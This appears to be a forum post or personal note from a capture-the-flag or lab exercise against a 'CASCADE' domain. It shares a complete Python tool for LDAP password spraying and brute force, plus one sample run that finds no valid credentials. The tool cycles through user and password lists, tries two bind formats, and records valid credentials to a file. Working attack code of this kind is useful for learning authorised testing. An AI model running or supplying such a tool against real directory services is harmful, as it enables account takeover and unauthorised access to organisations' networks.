MY crackmapexec does not work for ldap so i wrote script:
```python
#!/usr/bin/env python3
"""
ldapCheck.py

Small utility to test LDAP binds similar to CrackMapExec's ldap mode.

Usage examples:
  Single password, user file:
    ./ldapCheck.py -u users.txt -p 'Password123!' -d CASCADE 10.10.10.182

  Password file:
    ./ldapCheck.py -u users.txt -p pwfile.txt -d CASCADE 10.10.10.182

  Single user, multiple passwords:
    ./ldapCheck.py -u s.smith -p pass1 -p pass2 -d CASCADE 10.10.10.182

Options:
  -u USERNAME|FILE  Username(s) or file(s) with usernames (one per line). Can be repeated.
  -p PASSWORD|FILE  Password(s) or file(s) with passwords (one per line). Can be repeated.
  -d DOMAIN         Domain short name (required)
  target            Target LDAP host/IP (required)
  --delay FLOAT     Delay between attempts in seconds (default 1.0)
  --timeout INT     Connection bind timeout seconds (default 8)
  --out FILE        Output file for valid creds (default valid_creds.txt)
  --continue-on-success
                    If set, continue testing other passwords for same user after a success.
  --verbose         Verbose logging
"""
import argparse
import subprocess
import sys
import time
from pathlib import Path

def read_list_args(args_list):
    """
    Given a list of strings that may be filenames or literals,
    return a flat list of entries. If an entry is a readable file,
    read lines (strip) and return its contents; otherwise return the entry itself.
    """
    out = []
    for item in args_list or []:
        p = Path(item)
        if p.exists() and p.is_file():
            for line in p.read_text(encoding='latin-1', errors='ignore').splitlines():
                v = line.strip()
                if v:
                    out.append(v)
        else:
            out.append(item)
    return out

def try_ldap3_bind(host, domain, bind_user, password, timeout):
    """
    Try to bind using ldap3 with given bind_user and password.
    Returns True on success, False on failure (and error string).
    """
    try:
        from ldap3 import Server, Connection, ALL
    except Exception as e:
        return False, f"ldap3-missing:{e}"

    server = Server(host, get_info=ALL, connect_timeout=timeout)
    try:
        conn = Connection(server, user=bind_user, password=password, auto_bind=True, receive_timeout=timeout)
        conn.unbind()
        return True, None
    except Exception as e:
        return False, str(e)

def try_ldapwhoami_bind(host, bind_user, password, timeout):
    """
    Fallback to ldapwhoami binary. Returns True on success, False on failure.
    """
    cmd = ["ldapwhoami", "-x", "-H", f"ldap://{host}", "-D", bind_user, "-w", password]
    try:
        r = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout)
        return r.returncode == 0, None
    except Exception as e:
        return False, str(e)

def main():
    ap = argparse.ArgumentParser(description="LDAP batch binder (CME-like interface).")
    ap.add_argument("-u", "--username", action="append", required=True, help="Username or file with usernames (one per line). Can be repeated.")
    ap.add_argument("-p", "--password", action="append", required=True, help="Password or file with passwords (one per line). Can be repeated.")
    ap.add_argument("-d", "--domain", required=True, help="Domain short name (e.g. CASCADE)")
    ap.add_argument("target", help="Target LDAP host or IP")
    ap.add_argument("--delay", type=float, default=1.0, help="Delay between attempts (seconds). Default 1.0")
    ap.add_argument("--timeout", type=int, default=8, help="Connection timeout (seconds). Default 8")
    ap.add_argument("--out", default="valid_creds.txt", help="Output file for valid creds")
    ap.add_argument("--continue-on-success", action="store_true", help="Continue trying other passwords for same user after a success")
    ap.add_argument("--verbose", action="store_true", help="Verbose output")
    args = ap.parse_args()

    # Expand username and password inputs (files or literals)
    usernames = read_list_args(args.username)
    passwords = read_list_args(args.password)

    if not usernames:
        print("No usernames found after processing -u args.", file=sys.stderr)
        sys.exit(2)
    if not passwords:
        print("No passwords found after processing -p args.", file=sys.stderr)
        sys.exit(2)

    # Detect ldap3 availability
    use_ldap3 = True
    try:
        import ldap3  # noqa: F401
    except Exception:
        use_ldap3 = False
        if args.verbose:
            print("[*] ldap3 not available; falling back to ldapwhoami.", file=sys.stderr)

    successes = []
    domain = args.domain
    host = args.target

    for user in usernames:
        user = user.strip()
        if not user:
            continue
        if args.verbose:
            print(f"[*] user: {user}", file=sys.stderr)

        user_succeeded = False
        for pw in passwords:
            if args.verbose:
                print(f"    trying password: {pw}", file=sys.stderr)
            # Try two bind styles: DOMAIN\user and user@domain (UPN)
            binds = [f"{domain}\\{user}", f"{user}@{domain.lower()}"]

            for bind_user in binds:
                if use_ldap3:
                    ok, err = try_ldap3_bind(host, domain, bind_user, pw, timeout=args.timeout)
                    if ok:
                        print(f"[+] VALID: {bind_user}:{pw}")
                        successes.append((bind_user, pw))
                        with open(args.out, "a") as fh:
                            fh.write(f"{bind_user}:{pw}\n")
                        user_succeeded = True
                        break
                    else:
                        if args.verbose:
                            print(f"    ldap3 failed for {bind_user}: {err}", file=sys.stderr)
                        # if ldap3 reports it's missing, switch fallback
                        if isinstance(err, str) and err.startswith("ldap3-missing"):
                            use_ldap3 = False
                            if args.verbose:
                                print("[*] switching to ldapwhoami fallback", file=sys.stderr)
                            # fall through to ldapwhoami for this bind_user
                # fallback to ldapwhoami
                if not use_ldap3:
                    ok, err = try_ldapwhoami_bind(host, bind_user, pw, timeout=args.timeout)
                    if ok:
                        print(f"[+] VALID: {bind_user}:{pw}")
                        successes.append((bind_user, pw))
                        with open(args.out, "a") as fh:
                            fh.write(f"{bind_user}:{pw}\n")
                        user_succeeded = True
                        break
                    else:
                        if args.verbose:
                            print(f"    ldapwhoami failed for {bind_user}: {err}", file=sys.stderr)
            if user_succeeded and not args.continue_on_success:
                break
            time.sleep(args.delay)

    if successes:
        print(f"\n[+] Completed: valid creds written to {args.out}")
        for b, p in successes:
            print(f"    {b}:{p}")
    else:
        print("\n[-] No valid creds found.")

if __name__ == "__main__":
    main()

```

```
python3 ldapCheck.py -u users.txt -p 'DomainPwd!c4scadek3y6543217' -d CASCADE 10.10.10.182 

[-] No valid creds found.

```
